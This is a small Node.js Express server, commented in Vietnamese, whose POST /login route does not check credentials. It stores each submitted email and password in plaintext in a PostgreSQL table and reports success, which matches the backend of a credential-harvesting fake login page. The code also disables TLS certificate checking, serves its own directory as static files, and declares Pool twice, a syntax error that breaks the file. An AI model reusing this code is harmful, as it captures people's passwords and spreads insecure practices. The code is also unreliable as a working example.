const express = require("express");
const { Pool } = require("pg");
const path = require("path");

const app = express();

// Cho phép đọc form data
app.use(express.urlencoded({ extended: true }));
app.use(express.json());
// Cho phép load file tĩnh (HTML, CSS)
app.use(express.static(__dirname));

// Kết nối PostgreSQL
const { Pool } = require("pg");

const pool = new Pool({
    connectionString: process.env.DATABASE_URL,
    ssl: {
        rejectUnauthorized: false,
    },
});

// Test kết nối
pool.connect()
    .then(() => console.log("Kết nối PostgreSQL thành công"))
    .catch(err => console.log("Lỗi kết nối:", err));

// Route nhận login
app.post("/login", async(req, res) => {
    const { email, password } = req.body;

    try {
        await pool.query(
            "INSERT INTO login_data (email, password) VALUES ($1, $2)", [email, password]
        );

        res.json({ success: true });

    } catch (err) {
        console.error(err);
        res.json({ success: false });
    }
});

app.listen(3000, () => {
    console.log("Server chạy tại http://localhost:3000");
});